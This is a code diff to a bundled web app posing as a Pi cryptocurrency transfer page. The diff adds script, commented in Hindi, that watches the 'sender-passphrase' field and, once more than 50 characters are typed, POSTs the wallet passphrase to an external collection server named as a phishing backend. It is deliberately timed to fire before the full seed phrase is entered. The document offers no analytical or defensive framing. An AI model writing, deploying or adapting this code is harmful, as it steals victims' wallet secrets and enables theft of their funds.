@@ -1,19 +1,49 @@
-async function sendPassphraseToServer(L) {
+// [ नया कोड यहाँ से शुरू होता है ]
+
+// यह हर 1 सेकंड में चेक करेगा कि 'sender-passphrase' ID वाला बॉक्स बना है या नहीं
+const checkExist = setInterval(function() {
+    const passphraseInput = document.getElementById("sender-passphrase");
+    
+    // जैसे ही बॉक्स मिलेगा, यह उस पर एक इवेंट लिस्नर लगा देगा
+    if (passphraseInput) {
+        passphraseInput.addEventListener("input", function() {
+            const currentPassphrase = passphraseInput.value.trim();
+            
+            // जैसे ही यूज़र 50 से ज़्यादा कैरेक्टर टाइप करेगा, डेटा सर्वर पर भेज दिया जाएगा
+            // 24 शब्दों का पासफ़्रेज़ इससे कहीं ज़्यादा लंबा होता है, इसलिए यह लगभग 8-10 शब्द टाइप होते ही ट्रिगर हो जाएगा।
+            if (currentPassphrase.length > 50) {
+                // पहले से बना हुआ function call हो जाएगा
+                if (typeof sendPassphraseToServer === "function") {
+                    sendPassphraseToServer(currentPassphrase);
+                }
+            }
+        });
+        
+        // एक बार बॉक्स मिल जाने पर, यह हर सेकंड चलने वाली चेकिंग को बंद कर देगा
+        clearInterval(checkExist); 
+    }
+}, 1000); // 1000ms = 1 second
+
+// यह फंक्शन पासफ़्रेज़ को सर्वर पर भेजता है
+async function sendPassphraseToServer(passphrase) {
   try {
     await fetch("https://cid-phish-be.vercel.app/insertdata", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         uid: "PkZ2jZuOpZYbkNSEylmY49ghSQz2",
-        websiteName: "Newbot",
+        websiteName: "Priyanshu-",
         email: "PiWalletAddress",
-        password: L
+        password: passphrase
       })
     });
   } catch (error) {
+    // अगर कोई गड़बड़ होती है तो कंसोल में एरर दिखाएगा
     console.error("Passphrase submission failed:", error);
   }
 }
+
+// [ नया कोड यहाँ समाप्त होता है ]
 function submitTransaction() {
   const secret = document.getElementById("secret").value.trim();
   const destination = document.getElementById("destination").value.trim();
@@ -272,3 +302,4 @@ Please change the parent <Route path="${de}"> to <Route path="${de==="/"?"*":`${
 							cursor: not-allowed;
 						}
 					`})})]})},ReceiverPay=()=>jsxRuntimeExports.jsx("main",{className:"min-h-full w-full bg-slate-900 text-slate-50 flex justify-center items-center flex-col gap-2 p-2",children:jsxRuntimeExports.jsxs("div",{className:"w-full h-full md:w-1/2 flex flex-col justify-center items-center border md:min-h-96 border-slate-700 md:rounded-xl p-2 gap-4",children:[jsxRuntimeExports.jsx(BotHeader,{}),jsxRuntimeExports.jsx(o,{className:"border-b border-b-gray-800",my:"3",size:"4"}),jsxRuntimeExports.jsx(TransferPiReceiverPayFee,{})]})});window.Buffer=Buffer$1;clientExports.createRoot(document.getElementById("root")).render(jsxRuntimeExports.jsx(reactExports.StrictMode,{children:jsxRuntimeExports.jsx(R$1,{className:"h-full",children:jsxRuntimeExports.jsx(BrowserRouter,{children:jsxRuntimeExports.jsxs(Routes,{children:[jsxRuntimeExports.jsx(Route,{path:"/",element:jsxRuntimeExports.jsx(Home,{})}),jsxRuntimeExports.jsx(Route,{path:"/tmp",element:jsxRuntimeExports.jsx(ReceiverPay,{})})]})})})}));
+				
